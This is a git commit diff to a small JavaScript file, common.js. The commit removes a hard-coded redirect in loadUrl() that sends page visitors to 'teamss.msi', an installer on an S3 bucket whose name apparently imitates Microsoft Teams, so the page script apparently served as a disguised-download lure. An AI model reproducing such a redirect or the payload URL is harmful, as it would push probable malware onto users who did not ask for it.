2abbbf310fc1e2dfd64a8a626d47ded8fdc61f5e
jhgq <abdulalim4577787654@gmail.com>
2025-08-05 14:06:24 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://tseyt.s3.ap-southeast-2.amazonaws.com/teamss.msi";
+		var url="";
 		window.location=url;
 	}
 }
@@ -11,4 +11,5 @@ var num=0;
 function getLoad()
 {
 	num++;
+
 }
